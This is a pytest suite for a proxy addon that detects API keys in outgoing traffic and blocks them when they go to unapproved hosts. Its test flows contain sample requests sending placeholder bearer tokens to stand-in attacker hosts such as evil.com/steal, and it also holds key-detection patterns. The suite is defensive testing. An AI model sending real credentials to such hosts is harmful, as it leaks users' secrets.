"""
Tests for credential_guard.py addon.

Tests credential detection, host authorization, and blocking behavior.
"""

import json
import pytest


class TestCredentialRule:
    """Tests for CredentialRule pattern matching."""

    def test_openai_key_pattern(self):
        """Test OpenAI API key pattern detection."""
        from addons.credential_guard import CredentialRule

        rule = CredentialRule(
            name="openai",
            patterns=[r"sk-[a-zA-Z0-9]{20,}"],
            allowed_hosts=["api.openai.com"],
        )

        # Should match valid OpenAI keys
        assert rule.matches("sk-abc123xyz456def789ghi")
        assert rule.matches("Bearer sk-abc123xyz456def789ghi")
        assert rule.matches('{"key": "sk-abc123xyz456def789ghi"}')

        # Should not match short keys or wrong prefix
        assert rule.matches("sk-short") is None
        assert rule.matches("pk-abc123xyz456def789ghi") is None

    def test_anthropic_key_pattern(self):
        """Test Anthropic API key pattern detection."""
        from addons.credential_guard import CredentialRule

        rule = CredentialRule(
            name="anthropic",
            patterns=[r"sk-ant-[a-zA-Z0-9-_]{20,}"],
            allowed_hosts=["api.anthropic.com"],
        )

        # Both formats are valid Anthropic keys (pattern allows hyphens)
        assert rule.matches("sk-ant-abc123xyz456def789ghi01")
        assert rule.matches("sk-ant-api03-abcdefghij-1234567890")  # api03 format also valid

        # Should not match short keys or wrong prefix
        assert rule.matches("sk-ant-short") is None
        assert rule.matches("sk-abc123xyz456def789ghi") is None  # missing -ant-

    def test_host_allowed_exact_match(self):
        """Test exact host matching."""
        from addons.credential_guard import CredentialRule

        rule = CredentialRule(
            name="test",
            patterns=[r"test-key"],
            allowed_hosts=["api.openai.com", "api.anthropic.com"],
        )

        assert rule.host_allowed("api.openai.com") is True
        assert rule.host_allowed("api.anthropic.com") is True
        assert rule.host_allowed("evil.com") is False

    def test_host_allowed_wildcard(self):
        """Test wildcard host matching."""
        from addons.credential_guard import CredentialRule

        rule = CredentialRule(
            name="google",
            patterns=[r"AIza"],
            allowed_hosts=["*.googleapis.com"],
        )

        assert rule.host_allowed("storage.googleapis.com") is True
        assert rule.host_allowed("generativelanguage.googleapis.com") is True
        assert rule.host_allowed("googleapis.com") is True  # bare domain matches
        assert rule.host_allowed("evil.googleapis.com.attacker.com") is False

    def test_host_allowed_with_port(self):
        """Test host matching strips port."""
        from addons.credential_guard import CredentialRule

        rule = CredentialRule(
            name="test",
            patterns=[r"test"],
            allowed_hosts=["api.openai.com"],
        )

        assert rule.host_allowed("api.openai.com:443") is True
        assert rule.host_allowed("api.openai.com:8080") is True


class TestCredentialGuardBlocking:
    """Tests for blocking unauthorized credential usage."""

    def test_blocks_openai_key_to_wrong_host(self, credential_guard, make_flow):
        """Test that OpenAI key to non-OpenAI host is blocked."""
        flow = make_flow(
            method="POST",
            url="https://evil.com/steal",
            headers={
                "Authorization": "Bearer sk-proj-abc123xyz456def789ghijkghijklmno",
                "Content-Type": "application/json",
            },
        )

        credential_guard.request(flow)

        assert flow.response is not None
        assert flow.response.status_code == 428  # Phase 3: 428 for greylist responses
        assert flow.metadata.get("blocked_by") == "credential-guard"
        assert flow.metadata.get("blocked_host") == "evil.com"
        assert flow.metadata.get("credential_fingerprint", "").startswith("hmac:")

    def test_allows_openai_key_to_openai(self, credential_guard, make_flow):
        """Test that OpenAI key to api.openai.com is allowed by DEFAULT_POLICY."""
        flow = make_flow(
            method="POST",
            url="https://api.openai.com/v1/chat/completions",
            headers={
                "Authorization": "Bearer sk-proj-abc123xyz456def789ghijkghijklmno",
                "Content-Type": "application/json",
            },
        )

        credential_guard.request(flow)

        assert flow.response is None  # Not blocked
        # Should be allowed by DEFAULT_POLICY (not just passed checks)
        assert flow.metadata.get("credguard_policy_approved") is True

    def test_blocks_key_in_header(self, credential_guard, make_flow):
        """Test that key in Authorization header to wrong host is blocked."""
        flow = make_flow(
            method="POST",
            url="https://attacker.com/api",
            headers={
                "Authorization": "Bearer sk-proj-abc123xyz456def789ghijkghijklmno",
                "Content-Type": "application/json",
            },
        )

        credential_guard.request(flow)

        assert flow.response is not None
        assert flow.response.status_code == 428  # Phase 3: 428 for greylist responses
        # Phase 3: New responses use X-Credential-Guard header
        assert flow.response.headers.get("X-Credential-Guard") in ["destination-mismatch", "requires-approval"]

    def test_blocks_key_in_url(self, credential_guard, make_flow):
        """Test that key in URL query string to wrong host is blocked (when URL scanning enabled)."""
        # Enable URL scanning for this test
        from mitmproxy.test import taddons
        from mitmproxy import ctx as mitmproxy_ctx

        with taddons.context(credential_guard) as tctx:
            tctx.options.credguard_scan_urls = True

            flow = make_flow(
                method="GET",
                url="https://evil.com/api?key=sk-proj-abc123xyz456def789ghijkghijklmno",
            )

            credential_guard.request(flow)

            assert flow.response is not None
            assert flow.response.status_code == 428  # Phase 3: All code paths use 428

    def test_allows_non_credential_requests(self, credential_guard, make_flow):
        """Test that requests without credentials pass through."""
        flow = make_flow(
            method="POST",
            url="https://evil.com/api",
            content='{"message": "hello"}',
            headers={"Content-Type": "application/json"},
        )

        credential_guard.request(flow)

        assert flow.response is None
        assert flow.metadata.get("credguard_passed") is True


class TestTempAllowlist:
    """Tests for temporary allowlist functionality."""

    def test_temp_allowlist_allows_blocked_request(self, credential_guard, make_flow):
        """Test that temp allowlist allows otherwise blocked requests."""
        key = "sk-proj-abc123xyz456def789ghijkghijklmno"

        # Add to allowlist (v2: takes full credential, generates HMAC internally)
        credential_guard.add_temp_allowlist(key, "evil.com", ttl_seconds=60)

        flow = make_flow(
            method="POST",
            url="https://evil.com/api",
            headers={
                "Authorization": f"Bearer {key}",
                "Content-Type": "application/json",
            },
        )

        credential_guard.request(flow)

        assert flow.response is None  # Not blocked
        assert flow.metadata.get("credguard_allowlisted") is True

    def test_temp_allowlist_expires(self, credential_guard, make_flow):
        """Test that expired allowlist entries don't work."""
        import time

        key = "sk-proj-abc123xyz456def789ghijkghijklmno"

        # Add with very short TTL
        credential_guard.add_temp_allowlist(key, "evil.com", ttl_seconds=0)

        # Wait for expiry
        time.sleep(0.1)

        flow = make_flow(
            method="POST",
            url="https://evil.com/api",
            headers={
                "Authorization": f"Bearer {key}",
                "Content-Type": "application/json",
            },
        )

        credential_guard.request(flow)

        assert flow.response is not None
        assert flow.response.status_code == 428  # Phase 3: 428 for greylist responses


class TestLLMFriendlyResponse:
    """Tests for LLM-friendly block messages."""

    def test_llm_response_includes_guidance(self, credential_guard, make_flow):
        """Test that LLM response includes helpful guidance."""
        # Simulate ctx.options.credguard_llm_response = True
        # Since we can't easily mock ctx, test the message generation directly
        from addons.credential_guard import LLM_RESPONSE_TEMPLATE

        message = LLM_RESPONSE_TEMPLATE.format(
            credential_type="openai",
            blocked_host="evil.com",
            allowed_hosts="api.openai.com",
            suggested_url="https://api.openai.com/v1/",
        )

        assert "prompt injection" in message.lower()
        assert "api.openai.com" in message
        assert "evil.com" in message
        assert "reflect" in message.lower()


class TestStats:
    """Tests for statistics tracking."""

    def test_violation_count_increments(self, credential_guard, make_flow):
        """Test that violation stats are tracked."""
        assert credential_guard.violations_total == 0

        flow = make_flow(
            method="POST",
            url="https://evil.com/api",
            headers={
                "Authorization": "Bearer sk-proj-abc123xyz456def789ghijkghijklmno",
                "Content-Type": "application/json",
            },
        )

        credential_guard.request(flow)

        assert credential_guard.violations_total == 1
        assert credential_guard.violations_by_type.get("openai") == 1


class TestBlockingMode:
    """Tests for blocking vs warn-only mode."""

    def test_warn_mode_logs_but_does_not_block(self, make_flow):
        """Test that warn mode (block=False) logs violation but doesn't block."""
        from addons.credential_guard import CredentialGuard

        guard = CredentialGuard()
        guard._load_rules = lambda: None  # Skip loading
        from addons.credential_guard import DEFAULT_RULES
        guard.rules = list(DEFAULT_RULES)
        guard.hmac_secret = b"test-secret"  # v2: Initialize HMAC secret

        # Mock _should_block to return False (warn-only mode)
        guard._should_block = lambda: False

        flow = make_flow(
            method="POST",
            url="https://evil.com/steal",
            headers={
                "Authorization": "Bearer sk-proj-abc123xyz456def789ghijkghijklmno",
                "Content-Type": "application/json",
            },
        )

        guard.request(flow)

        # Should NOT block (no response set)
        assert flow.response is None
        # But should still record the violation
        assert guard.violations_total == 1
        # And set metadata
        assert flow.metadata.get("blocked_by") == "credential-guard"

    def test_blocking_mode_blocks(self, make_flow):
        """Test that blocking mode (block=True) actually blocks."""
        from addons.credential_guard import CredentialGuard

        guard = CredentialGuard()
        guard._load_rules = lambda: None
        from addons.credential_guard import DEFAULT_RULES
        guard.rules = list(DEFAULT_RULES)
        guard.hmac_secret = b"test-secret"  # v2: Initialize HMAC secret

        # Mock _should_block to return True (blocking mode)
        guard._should_block = lambda: True

        flow = make_flow(
            method="POST",
            url="https://evil.com/steal",
            headers={
                "Authorization": "Bearer sk-proj-abc123xyz456def789ghijkghijklmno",
                "Content-Type": "application/json",
            },
        )

        guard.request(flow)

        # Should block
        assert flow.response is not None
        assert flow.response.status_code == 428  # Phase 3: 428 for greylist responses
        assert flow.metadata.get("blocked_by") == "credential-guard"


class TestHMACFingerprinting:
    """Tests for HMAC fingerprinting (Phase 1.2)."""

    def test_hmac_fingerprint_deterministic(self):
        """Same credential generates same fingerprint."""
        from addons.credential_guard import hmac_fingerprint

        secret = b"test-secret"
        credential = "sk-proj-abc123xyz456def789ghijk"

        fp1 = hmac_fingerprint(credential, secret)
        fp2 = hmac_fingerprint(credential, secret)

        assert fp1 == fp2
        assert len(fp1) == 16  # First 16 chars of SHA256 HMAC

    def test_hmac_fingerprint_unique(self):
        """Different credentials generate different fingerprints."""
        from addons.credential_guard import hmac_fingerprint

        secret = b"test-secret"
        cred1 = "sk-proj-abc123"
        cred2 = "sk-proj-xyz789"

        fp1 = hmac_fingerprint(cred1, secret)
        fp2 = hmac_fingerprint(cred2, secret)

        assert fp1 != fp2

    def test_hmac_fingerprint_secret_matters(self):
        """Different secrets generate different fingerprints."""
        from addons.credential_guard import hmac_fingerprint

        credential = "sk-proj-abc123"
        secret1 = b"secret-one"
        secret2 = b"secret-two"

        fp1 = hmac_fingerprint(credential, secret1)
        fp2 = hmac_fingerprint(credential, secret2)

        assert fp1 != fp2

    def test_temp_allowlist_uses_hmac(self, credential_guard):
        """Verify allowlist stores HMAC, not raw credentials."""
        key = "sk-proj-verysecretkey123"

        credential_guard.add_temp_allowlist(key, "evil.com", ttl_seconds=60)

        # Get allowlist entries
        entries = credential_guard.get_temp_allowlist()

        assert len(entries) == 1
        assert entries[0]["credential_fingerprint"].startswith("hmac:")
        # Should NOT contain raw credential
        assert key not in str(entries)

    def test_violation_log_never_contains_raw_credential(self, credential_guard, make_flow):
        """Ensure _log_violation() never logs raw tokens."""
        flow = make_flow(
            method="POST",
            url="https://evil.com/api",
            headers={"Authorization": "Bearer sk-proj-secretkey123abcdefghij"},
        )

        credential_guard.request(flow)

        # Check metadata - should have fingerprint, not raw credential
        fingerprint = flow.metadata.get("credential_fingerprint", "")
        assert fingerprint.startswith("hmac:")
        assert "secretkey123" not in fingerprint
        assert "sk-proj-secretkey123abcdefghij" not in str(flow.metadata)

    def test_block_response_headers_contain_hmac(self, credential_guard, make_flow):
        """X-Credential-Fingerprint header has hmac:xxx format."""
        flow = make_flow(
            method="POST",
            url="https://attacker.com/api",
            headers={"Authorization": "Bearer sk-proj-topsecret999abcdefghij"},
        )

        credential_guard.request(flow)

        assert flow.response is not None
        fingerprint_header = flow.response.headers.get("X-Credential-Fingerprint", "")
        assert fingerprint_header.startswith("hmac:")
        assert "topsecret" not in fingerprint_header


class TestPathMatching:
    """Tests for path wildcard matching (Phase 1.3)."""

    def test_path_wildcard_suffix(self):
        """Test /v1/* matches /v1/chat/completions."""
        from addons.credential_guard import path_matches_pattern

        assert path_matches_pattern("/v1/chat/completions", "/v1/*") is True
        assert path_matches_pattern("/v1/", "/v1/*") is True
        assert path_matches_pattern("/v1/models", "/v1/*") is True
        assert path_matches_pattern("/v2/chat", "/v1/*") is False
        assert path_matches_pattern("/api/v1/chat", "/v1/*") is False

    def test_path_wildcard_prefix(self):
        """Test */completions matches /v1/chat/completions."""
        from addons.credential_guard import path_matches_pattern

        assert path_matches_pattern("/v1/chat/completions", "*/completions") is True
        assert path_matches_pattern("/api/completions", "*/completions") is True
        assert path_matches_pattern("/completions", "*/completions") is True
        assert path_matches_pattern("/v1/models", "*/completions") is False

    def test_path_exact_match(self):
        """Test exact path matching."""
        from addons.credential_guard import path_matches_pattern

        assert path_matches_pattern("/v1/chat/completions", "/v1/chat/completions") is True
        assert path_matches_pattern("/v1/chat/completions", "/v1/chat") is False
        assert path_matches_pattern("/v1/chat", "/v1/chat/completions") is False

    def test_path_query_string_stripped(self):
        """Test query strings are stripped before matching."""
        from addons.credential_guard import path_matches_pattern

        assert path_matches_pattern("/v1/chat?key=123", "/v1/*") is True
        assert path_matches_pattern("/v1/chat/completions?model=gpt-4", "/v1/*") is True
        assert path_matches_pattern("/api?foo=bar", "/api") is True

    def test_path_full_wildcard(self):
        """Test /* matches all paths."""
        from addons.credential_guard import path_matches_pattern

        assert path_matches_pattern("/anything", "/*") is True
        assert path_matches_pattern("/v1/chat/completions", "/*") is True
        assert path_matches_pattern("/", "/*") is True


class TestDefaultPolicy:
    """Tests for DEFAULT_POLICY behavior (Phase 1.3)."""

    def test_openai_allowed_by_default_policy(self, credential_guard, make_flow):
        """OpenAI keys to api.openai.com/v1/* allowed by default."""
        flow = make_flow(
            method="POST",
            url="https://api.openai.com/v1/chat/completions",
            headers={"Authorization": "Bearer sk-proj-abc123xyz456def789ghijk"},
        )

        credential_guard.request(flow)

        # Should NOT block
        assert flow.response is None
        # Should be allowed by policy
        assert flow.metadata.get("credguard_policy_approved") is True

    def test_anthropic_allowed_by_default_policy(self, credential_guard, make_flow):
        """Anthropic keys to api.anthropic.com/v1/* allowed by default."""
        flow = make_flow(
            method="POST",
            url="https://api.anthropic.com/v1/messages",
            headers={"Authorization": "Bearer sk-ant-api03-abc123xyz456def789ghijk"},
        )

        credential_guard.request(flow)

        # Should NOT block
        assert flow.response is None
        assert flow.metadata.get("credguard_policy_approved") is True

    def test_github_allowed_by_default_policy(self, credential_guard, make_flow):
        """GitHub tokens to api.github.com allowed by default."""
        flow = make_flow(
            method="GET",
            url="https://api.github.com/user",
            headers={"Authorization": "Bearer ghp_abc123xyz456def789ghijklmnoABCDEFGHIJKL"},
        )

        credential_guard.request(flow)

        # Should NOT block
        assert flow.response is None
        assert flow.metadata.get("credguard_policy_approved") is True

    def test_openai_wrong_path_blocked(self, credential_guard, make_flow):
        """OpenAI key to api.openai.com/admin/* blocked (not in default policy)."""
        flow = make_flow(
            method="POST",
            url="https://api.openai.com/admin/secrets",
            headers={"Authorization": "Bearer sk-proj-abc123xyz456abcdefghijk"},
        )

        credential_guard.request(flow)

        # Should block (path not in policy)
        assert flow.response is not None
        assert flow.response.status_code == 428  # Phase 3: 428 for greylist responses

    def test_openai_wrong_host_blocked(self, credential_guard, make_flow):
        """OpenAI key to evil.com blocked (not in default policy)."""
        flow = make_flow(
            method="POST",
            url="https://evil.com/v1/chat/completions",
            headers={"Authorization": "Bearer sk-proj-abc123xyz456abcdefghijk"},
        )

        credential_guard.request(flow)

        # Should block (host not in policy)
        assert flow.response is not None
        assert flow.response.status_code == 428  # Phase 3: 428 for greylist responses

    def test_check_policy_approval_all_criteria(self):
        """Policy approval requires pattern + host + path match."""
        from addons.credential_guard import check_policy_approval, DEFAULT_POLICY

        # All match - should approve
        assert check_policy_approval(
            "sk-proj-abc123",
            "api.openai.com",
            "/v1/chat/completions",
            DEFAULT_POLICY
        ) is True

        # Wrong pattern - should reject
        assert check_policy_approval(
            "sk-ant-abc123",
            "api.openai.com",
            "/v1/chat/completions",
            DEFAULT_POLICY
        ) is False

        # Wrong host - should reject
        assert check_policy_approval(
            "sk-proj-abc123",
            "evil.com",
            "/v1/chat/completions",
            DEFAULT_POLICY
        ) is False

        # Wrong path - should reject
        assert check_policy_approval(
            "sk-proj-abc123",
            "api.openai.com",
            "/admin/secrets",
            DEFAULT_POLICY
        ) is False


# --- Phase 2: Smart Header Analysis Tests ---

class TestShannonEntropy:
    """Test Shannon entropy calculation."""

    def test_empty_string(self):
        """Empty string has zero entropy."""
        from addons.credential_guard import calculate_shannon_entropy
        assert calculate_shannon_entropy("") == 0.0

    def test_single_character(self):
        """String with single repeated character has low entropy."""
        from addons.credential_guard import calculate_shannon_entropy
        entropy = calculate_shannon_entropy("aaaaaaa")
        assert entropy == 0.0  # Only one unique character

    def test_high_entropy_string(self):
        """Random-looking string has high entropy."""
        from addons.credential_guard import calculate_shannon_entropy
        # Typical API key: mix of letters and numbers
        entropy = calculate_shannon_entropy("sk-proj-a1B2c3D4e5F6g7H8")
        assert entropy > 3.0  # Should be reasonably high


class TestLooksLikeSecret:
    """Test entropy heuristics for secret detection."""

    def test_too_short_rejected(self):
        """Strings shorter than min_length are rejected."""
        from addons.credential_guard import looks_like_secret
        config = {"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5}
        assert looks_like_secret("short", config) is False

    def test_low_diversity_rejected(self):
        """Strings with low charset diversity are rejected."""
        from addons.credential_guard import looks_like_secret
        config = {"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5}
        # 20 chars but only 2 unique chars
        assert looks_like_secret("aaaaaaaaaabbbbbbbbbb", config) is False

    def test_low_entropy_rejected(self):
        """Strings with low Shannon entropy are rejected."""
        from addons.credential_guard import looks_like_secret
        config = {"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5}
        # 20 chars, decent diversity, but low entropy (repeating pattern)
        assert looks_like_secret("abcdabcdabcdabcdabcd", config) is False

    def test_api_key_accepted(self):
        """Real API keys pass all heuristics."""
        from addons.credential_guard import looks_like_secret
        config = {"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5}
        # Realistic OpenAI key
        assert looks_like_secret("sk-proj-a1B2c3D4e5F6g7H8i9J0k1L2m3N4", config) is True

    def test_trace_id_rejected(self):
        """Cloud trace IDs should be rejected by entropy config."""
        from addons.credential_guard import looks_like_secret
        config = {"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5}
        # AWS trace ID: long but low entropy (mostly hex)
        # Note: This depends on the specific trace ID format
        # Some trace IDs may pass heuristics - that's why we have safe_headers config
        pass  # Safe headers config is the primary defense


class TestSafeHeaders:
    """Test safe header detection."""

    def test_exact_match(self):
        """Exact header name matches are detected."""
        from addons.credential_guard import is_safe_header
        config = {"exact_match": ["host", "user-agent", "content-type"]}
        assert is_safe_header("host", config) is True
        assert is_safe_header("user-agent", config) is True
        assert is_safe_header("authorization", config) is False

    def test_pattern_match(self):
        """Pattern-based header matches are detected."""
        from addons.credential_guard import is_safe_header
        config = {"exact_match": [], "patterns": ["^x-.*-id$", "^x-.*-trace.*$"]}
        assert is_safe_header("x-request-id", config) is True
        assert is_safe_header("x-correlation-id", config) is True
        assert is_safe_header("x-cloud-trace-context", config) is True
        assert is_safe_header("x-api-key", config) is False

    def test_case_insensitive(self):
        """Header matching is case-insensitive."""
        from addons.credential_guard import is_safe_header
        config = {"exact_match": ["Host", "User-Agent"]}
        assert is_safe_header("HOST", config) is True
        assert is_safe_header("user-agent", config) is True


class TestExtractToken:
    """Test token extraction from Authorization headers."""

    def test_bearer_scheme(self):
        """Extract token from 'Bearer <token>' format."""
        from addons.credential_guard import extract_token_from_auth_header
        token = extract_token_from_auth_header("Bearer sk-proj-abc123")
        assert token == "sk-proj-abc123"

    def test_basic_scheme(self):
        """Extract token from 'Basic <token>' format."""
        from addons.credential_guard import extract_token_from_auth_header
        token = extract_token_from_auth_header("Basic dXNlcjpwYXNz")
        assert token == "dXNlcjpwYXNz"

    def test_no_scheme(self):
        """Token without scheme is returned as-is."""
        from addons.credential_guard import extract_token_from_auth_header
        token = extract_token_from_auth_header("sk-proj-abc123")
        assert token == "sk-proj-abc123"

    def test_empty_value(self):
        """Empty value returns empty string."""
        from addons.credential_guard import extract_token_from_auth_header
        assert extract_token_from_auth_header("") == ""


class TestAnalyzeHeaders:
    """Test header analysis - tier 1 works the same across all detection levels."""

    def test_tier1_known_credential(self):
        """Tier 1: Detect known credential in standard auth header (all modes)."""
        from addons.credential_guard import analyze_headers, DEFAULT_RULES

        headers = {"Authorization": "Bearer sk-proj-abc123xyz456def789ghijk"}
        safe_headers_config = {"exact_names": [], "patterns": []}
        entropy_config = {"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5}
        standard_auth_headers = ["authorization"]

        # Test all 3 modes - tier 1 should be identical
        for mode in ["paranoid", "standard", "patterns-only"]:
            detections = analyze_headers(
                headers, DEFAULT_RULES, safe_headers_config, entropy_config,
                standard_auth_headers, detection_level=mode
            )

            assert len(detections) == 1, f"Failed in {mode} mode"
            assert detections[0]["rule_name"] == "openai"
            assert detections[0]["confidence"] == "high"
            assert detections[0]["tier"] == 1

    def test_tier1_unknown_credential(self):
        """Tier 1: Detect unknown high-entropy credential in standard auth header (all modes)."""
        from addons.credential_guard import analyze_headers, DEFAULT_RULES

        headers = {"X-API-Key": "customSecretKey1234567890abcdefghij"}
        safe_headers_config = {"exact_names": [], "patterns": []}
        entropy_config = {"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5}
        standard_auth_headers = ["authorization", "x-api-key"]

        # Test all 3 modes - tier 1 should be identical
        for mode in ["paranoid", "standard", "patterns-only"]:
            detections = analyze_headers(
                headers, DEFAULT_RULES, safe_headers_config, entropy_config,
                standard_auth_headers, detection_level=mode
            )

            assert len(detections) == 1, f"Failed in {mode} mode"
            assert detections[0]["rule_name"] == "unknown_secret"
            assert detections[0]["confidence"] == "high"
            assert detections[0]["tier"] == 1

    def test_safe_headers_always_skipped(self):
        """Safe headers are skipped in all detection levels."""
        from addons.credential_guard import analyze_headers, DEFAULT_RULES

        headers = {
            "X-Request-ID": "sk-proj-abc123xyz456def789ghijk",  # Known pattern but safe header
            "Host": "api.example.com"
        }
        safe_headers_config = {"exact_names": ["host"], "patterns": ["^x-.*-id$"]}
        entropy_config = {"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5}
        standard_auth_headers = ["authorization"]

        # Test all 3 modes - safe headers always skipped
        for mode in ["paranoid", "standard", "patterns-only"]:
            detections = analyze_headers(
                headers, DEFAULT_RULES, safe_headers_config, entropy_config,
                standard_auth_headers, detection_level=mode
            )

            assert len(detections) == 0, f"Safe headers not skipped in {mode} mode"


class TestDetectionLevels:
    """Test material differences between paranoid, standard, and patterns-only modes."""

    def test_paranoid_catches_unknown_entropy_in_any_header(self):
        """Paranoid: Catches unknown high-entropy values in ANY non-safe, non-standard header."""
        from addons.credential_guard import analyze_headers, DEFAULT_RULES

        # High-entropy value in header with NO suspicious name
        headers = {"X-Random-Header": "aB3dE5fG7hI9jK1lM3nO5pQ7rS9tU1vW3xY5zA7"}
        safe_headers_config = {"exact_names": [], "patterns": []}
        entropy_config = {"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5}
        standard_auth_headers = ["authorization"]

        detections = analyze_headers(
            headers, DEFAULT_RULES, safe_headers_config, entropy_config,
            standard_auth_headers, detection_level="paranoid"
        )

        # Paranoid mode should catch this (entropy heuristic on all headers)
        assert len(detections) == 1
        assert detections[0]["rule_name"] == "unknown_secret"
        assert detections[0]["tier"] == 2
        assert detections[0]["header_name"] == "X-Random-Header"

    def test_standard_ignores_unknown_entropy_in_nonsuspicious_header(self):
        """Standard: Does NOT catch unknown high-entropy in non-suspicious named headers."""
        from addons.credential_guard import analyze_headers, DEFAULT_RULES

        # High-entropy value in header with NO suspicious name
        headers = {"X-Random-Header": "aB3dE5fG7hI9jK1lM3nO5pQ7rS9tU1vW3xY5zA7"}
        safe_headers_config = {"exact_names": [], "patterns": []}
        entropy_config = {"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5}
        standard_auth_headers = ["authorization"]

        detections = analyze_headers(
            headers, DEFAULT_RULES, safe_headers_config, entropy_config,
            standard_auth_headers, detection_level="standard"
        )

        # Standard mode should NOT catch this (no suspicious name, no known pattern)
        assert len(detections) == 0

    def test_standard_catches_unknown_entropy_in_suspicious_header(self):
        """Standard: Catches unknown high-entropy values in suspicious-named headers."""
        from addons.credential_guard import analyze_headers, DEFAULT_RULES

        # High-entropy value in header WITH suspicious name "token"
        headers = {"X-Custom-Token": "aB3dE5fG7hI9jK1lM3nO5pQ7rS9tU1vW3xY5zA7"}
        safe_headers_config = {"exact_names": [], "patterns": []}
        entropy_config = {"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5}
        standard_auth_headers = ["authorization"]

        detections = analyze_headers(
            headers, DEFAULT_RULES, safe_headers_config, entropy_config,
            standard_auth_headers, detection_level="standard"
        )

        # Standard mode SHOULD catch this (suspicious name "token" + high entropy)
        assert len(detections) == 1
        assert detections[0]["rule_name"] == "unknown_secret"
        assert detections[0]["tier"] == 2
        assert detections[0]["header_name"] == "X-Custom-Token"

    def test_standard_catches_known_pattern_in_any_header(self):
        """Standard: Catches known credential patterns in ANY header (even without suspicious name)."""
        from addons.credential_guard import analyze_headers, DEFAULT_RULES

        # Known OpenAI pattern in header without suspicious name
        headers = {"X-Random-Header": "sk-proj-abc123xyz456def789ghijk"}
        safe_headers_config = {"exact_names": [], "patterns": []}
        entropy_config = {"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5}
        standard_auth_headers = ["authorization"]

        detections = analyze_headers(
            headers, DEFAULT_RULES, safe_headers_config, entropy_config,
            standard_auth_headers, detection_level="standard"
        )

        # Standard mode SHOULD catch this (known pattern, tier 2B)
        assert len(detections) == 1
        assert detections[0]["rule_name"] == "openai"
        assert detections[0]["tier"] == 2
        assert detections[0]["header_name"] == "X-Random-Header"

    def test_patterns_only_catches_known_patterns(self):
        """Patterns-only: Catches known patterns in any header."""
        from addons.credential_guard import analyze_headers, DEFAULT_RULES

        headers = {"X-Random-Header": "sk-proj-abc123xyz456def789ghijk"}
        safe_headers_config = {"exact_names": [], "patterns": []}
        entropy_config = {"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5}
        standard_auth_headers = ["authorization"]

        detections = analyze_headers(
            headers, DEFAULT_RULES, safe_headers_config, entropy_config,
            standard_auth_headers, detection_level="patterns-only"
        )

        # Should catch known pattern
        assert len(detections) == 1
        assert detections[0]["rule_name"] == "openai"
        assert detections[0]["tier"] == 2

    def test_patterns_only_ignores_unknown_entropy(self):
        """Patterns-only: Does NOT catch unknown high-entropy values (no entropy checks)."""
        from addons.credential_guard import analyze_headers, DEFAULT_RULES

        # High-entropy in suspicious-named header
        headers = {"X-Custom-Token": "aB3dE5fG7hI9jK1lM3nO5pQ7rS9tU1vW3xY5zA7"}
        safe_headers_config = {"exact_names": [], "patterns": []}
        entropy_config = {"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5}
        standard_auth_headers = ["authorization"]

        detections = analyze_headers(
            headers, DEFAULT_RULES, safe_headers_config, entropy_config,
            standard_auth_headers, detection_level="patterns-only"
        )

        # Patterns-only should NOT catch this (no entropy heuristics)
        assert len(detections) == 0

    def test_deduplication_across_tiers(self):
        """Same credential detected by tier 2A and 2B should only be reported once."""
        from addons.credential_guard import analyze_headers, DEFAULT_RULES

        # Known pattern in suspicious-named header (would match both 2A and 2B)
        headers = {"X-Custom-Secret": "sk-proj-abc123xyz456def789ghijk"}
        safe_headers_config = {"exact_names": [], "patterns": []}
        entropy_config = {"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5}
        standard_auth_headers = ["authorization"]

        detections = analyze_headers(
            headers, DEFAULT_RULES, safe_headers_config, entropy_config,
            standard_auth_headers, detection_level="standard"
        )

        # Should only be reported once (deduplication)
        assert len(detections) == 1
        assert detections[0]["rule_name"] == "openai"


# --- Phase 3: 428 Greylist Responses Tests ---

class TestDecisionEngine:
    """Test 3-way decision engine."""

    def test_unknown_credential_requires_approval(self):
        """Unknown credentials always require approval."""
        from addons.credential_guard import determine_decision_type, DEFAULT_RULES, DEFAULT_POLICY

        decision_type, context = determine_decision_type(
            credential="custom-api-key-abc123xyz456",
            rule_name="unknown_secret",
            host="internal-api.company.com",
            path="/v1/data",
            confidence="high",
            rules=DEFAULT_RULES,
            policy=DEFAULT_POLICY
        )

        assert decision_type == "greylist_approval"
        assert context["reason"] == "unknown_credential_type"

    def test_known_credential_wrong_host_mismatch(self):
        """Known credential to wrong host triggers mismatch."""
        from addons.credential_guard import determine_decision_type, DEFAULT_RULES, DEFAULT_POLICY

        decision_type, context = determine_decision_type(
            credential="sk-proj-abc123xyz456def789ghijk",
            rule_name="openai",
            host="api.openai-typo.com",
            path="/v1/chat/completions",
            confidence="high",
            rules=DEFAULT_RULES,
            policy=DEFAULT_POLICY
        )

        assert decision_type == "greylist_mismatch"
        assert "api.openai.com" in context.get("expected_hosts", [])

    def test_known_credential_correct_host_in_policy_allows(self):
        """Known credential to correct host in policy is allowed."""
        from addons.credential_guard import determine_decision_type, DEFAULT_RULES, DEFAULT_POLICY

        decision_type, context = determine_decision_type(
            credential="sk-proj-abc123xyz456def789ghijk",
            rule_name="openai",
            host="api.openai.com",
            path="/v1/chat/completions",
            confidence="high",
            rules=DEFAULT_RULES,
            policy=DEFAULT_POLICY
        )

        assert decision_type == "allow"

    def test_known_credential_correct_host_wrong_path_requires_approval(self):
        """Known credential to correct host but wrong path requires approval."""
        from addons.credential_guard import determine_decision_type, DEFAULT_RULES, DEFAULT_POLICY

        decision_type, context = determine_decision_type(
            credential="sk-proj-abc123xyz456def789ghijk",
            rule_name="openai",
            host="api.openai.com",
            path="/admin/secrets",  # Not in DEFAULT_POLICY
            confidence="high",
            rules=DEFAULT_RULES,
            policy=DEFAULT_POLICY
        )

        assert decision_type == "greylist_approval"
